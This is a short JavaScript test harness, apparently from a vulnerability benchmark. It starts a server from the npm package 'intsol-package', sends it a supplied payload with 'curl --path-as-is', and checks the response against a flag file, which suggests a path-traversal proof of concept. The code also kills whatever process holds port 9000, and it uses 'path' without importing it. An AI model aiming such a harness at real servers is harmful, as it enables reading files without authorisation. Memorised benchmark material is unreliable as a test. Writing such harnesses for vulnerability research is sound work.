function exploitFunction(payload) {
  const { execSync, exec } = require("child_process");
  const fs = require("fs");
  const sleep = require("sleep");

  // Clean up any existing server on port 9000
  try {
    execSync("fuser -k 9000/tcp");
  } catch (e) {}

  // Start the server
  const server = "node ./node_modules/intsol-package/index.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    sleep.sleep(2);

    // Perform the attack
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${payload}"`;
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Attack failed: ${error}`);
        return;
      }

      // Verify the output
      const expectedOutput = fs.readFileSync(process.env.PATH_TO_FLAG || path.resolve(__dirname, "../flag.html")).toString();
      expect(stdout).toBe(expectedOutput);
    });
  });
}

module.exports = { exploitFunction };